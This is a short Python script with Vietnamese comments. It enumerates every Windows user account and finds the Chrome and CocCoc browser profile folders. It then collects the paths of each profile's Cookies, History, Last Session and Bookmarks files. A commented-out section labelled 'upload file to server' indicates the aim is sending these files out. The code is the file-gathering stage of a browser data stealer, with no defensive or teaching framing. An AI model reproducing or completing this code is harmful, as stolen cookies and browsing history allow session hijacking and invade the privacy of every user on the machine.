from os.path import os, exists
list_file = ['History','Last Session','Cookies','Bookmarks']
def get_chrome():
#    (1) get user in computer    
    list_user = [filename 
                            for filename in os.listdir("C:\\Users\\")]
    print("list user {0}".format(list_user))

# (2)đường dẫn tới user data của chrome+coccoc có thể có  
    list_folder =[ "C:\\Users\\" +user+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
                    for user in list_user]
    list_folder +=[ "C:\\Users\\" +user+'\\AppData\\Local\\CocCoc\\Browser\\User Data\\'
                        for user in list_user]
#     remove folder dont exit
    list_folder = [folder 
                   for folder in list_folder
                    if(exists(folder))]
    print("list folder : {0}" .format(list_folder))
    
    
#     for filename in os.listdir(list_folder[1]):
#         str+='<p style="color:blue"> ' +filename + '</p>'
#(3)xác định thư mục có tồn tại file cần lấy
#     tìm all folder trong user data của chrome
    list_folder_contain_file = []
    for folder in list_folder:
        list_all = os.listdir(folder)
        for folder_child in list_all:
            list_folder_contain_file.append(folder+folder_child)
    
    print("all folder in data folder {0}" .format(list_folder_contain_file))
    
    list_path_files = [path+"\\"+file
                        for path in list_folder_contain_file 
                            for file in list_file
                                if(exists(path+"\\"+file))]
#     for path in list_folder_contain_file:
#         for file in list_file:
#             print("a"+path+file)
#             if(exists(path+file)):
#                 print(path+file)
    print("list path file:{0} ".format(list_path_files))      
    
#     # upload file to server   
#     for path in list_path_chrome:
#         path_bookmark = path + '\\Bookmarks'
#         if(exists(path_bookmark)):
#             str += path_bookmark
    return list_path_files
get_chrome()      
# print("abc")